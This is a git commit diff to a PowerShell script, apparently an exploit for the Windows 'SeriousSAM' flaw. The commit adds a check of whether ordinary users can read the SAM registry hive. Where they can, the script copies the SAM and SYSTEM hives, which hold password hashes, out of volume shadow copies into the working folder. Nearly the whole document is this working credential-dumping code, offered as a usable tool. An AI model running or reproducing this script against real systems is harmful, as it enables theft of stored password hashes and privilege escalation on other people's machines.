50b67c02e017ba28e3d1674ea5b9a6d4210c7482
romarroca <87074019+romarroca@users.noreply.github.com>
2021-07-22 19:39:31 +0800

    added check if vuln or not
    added check if vuln or not

--- serioussam.ps1
+++ serioussam.ps1
@@ -1,13 +1,20 @@
-$inputValue = 0
-$inputValid = [int]::TryParse((Read-Host 'Enter number of iteration'), [ref]$inputValue)
-if (-not $inputValid) {
-    Write-Host "your input was not an integer..."
-    exit
-} else {
-	$dir = Get-Location
+$CheckPerm = icacls C:\windows\system32\config\sam
+    if ($CheckPerm -like '*BUILTIN\Users:(I)(RX*)*') {
+        write-host "Host is likely vulnerable"
+        $inputValue = 0
+		$inputValid = [int]::TryParse((Read-Host 'Enter number of iteration'), [ref]$inputValue)
+		if (-not $inputValid) {
+		    Write-Host "your input was not an integer..."
+		    exit
+		} else {
+			$dir = Get-Location
 
-	foreach($i in 1..$inputValue){
-		Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\SAM" "$dir\SAM$i"
-		Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\SYSTEM" "$dir\SYSTEM$i"
+			foreach($i in 1..$inputValue){
+				Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\SAM" "$dir\SAM$i"
+				Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\SYSTEM" "$dir\SYSTEM$i"
+				}
 		}
-}
+    }
+    else {
+        Write-Host "probably not vulnerable"
+    }
